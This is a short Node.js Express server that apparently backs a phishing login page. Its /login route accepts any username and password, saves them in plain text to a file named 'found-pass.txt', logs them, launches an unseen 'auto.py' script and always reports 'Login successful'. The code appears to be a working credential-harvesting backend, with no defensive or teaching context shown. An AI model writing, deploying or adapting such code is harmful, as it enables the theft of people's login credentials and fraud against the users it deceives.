const express = require("express");
const path = require("path");
const fs = require("fs");
const cp = require("child_process");

const app = express();
const PORT = 5000;

app.use(express.json());
app.use(express.static(path.join(path.resolve(), "public")));

app.post("/login", (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send("Username and password are required");
    }

    const hashedPassword = password;

    const path = "./found-pass.txt";
    
    try {
        fs.writeFileSync(path, `${username}\n${hashedPassword}`, "utf-8");
        console.log(username, hashedPassword);

        fs.access(path, fs.constants.F_OK, (err) => {
            if (err) {
                console.log('Directory does not exist!');
            } else {
                console.log('Directory exists!');
                const pythonProcess = cp.spawn('python', ['-u', 'auto.py']);

                pythonProcess.stdout.on('data', (data) => {
                    console.log(`${data.toString()}`);
                });
                
                pythonProcess.stderr.on('data', (data) => {
                    console.error(`stderr: ${data.toString()}`);
                });
            }
        })

        res.status(200).send({ message: "Login successful" });
    } catch (error) {
        console.error("Error saving login:", error);
        res.status(500).send("Internal Server Error");
    }
});

app.listen(PORT, () => {
    console.log(`App listening on port http://127.0.0.1:${PORT}`);
});
